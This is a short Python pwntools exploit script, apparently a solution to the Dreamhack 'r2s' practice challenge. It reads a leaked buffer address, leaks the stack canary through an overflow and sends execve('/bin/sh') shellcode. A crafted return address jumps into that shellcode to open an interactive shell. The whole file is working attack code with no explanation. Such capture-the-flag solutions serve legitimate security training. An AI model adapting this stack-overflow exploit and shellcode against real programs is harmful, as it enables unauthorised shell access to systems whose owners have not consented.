#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./r2s',checksec=False)

p = process(exe.path)
# p = remote('host3.dreamhack.games',18678)

p.recvuntil(b'buf: ')

buf_addr = int(p.recvline()[:-1],16)
log.info("buf: " + hex(buf_addr))

shellcode = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch='amd64')
#gdb.attach(p, gdbscript='''
	#b*main+154
	#b*main+159
	#b*main+239
	#c
	#''')
#input()    
payload = b'A'*89
p.sendafter(b'Input: ',payload)

p.recvuntil(b'A'*89)
canary_leak = u64(b'\x00' + p.recv(7)) 
#print(hex(canary_leak))
log.info("canary: " + hex(canary_leak))

payload = shellcode
payload = payload.ljust(88,b'A')
log.info("payload: " + str(payload))
payload += p64(canary_leak)
payload += b'A'*8
payload += p64(buf_addr)

p.sendlineafter(b'Input: ',payload)

p.interactive()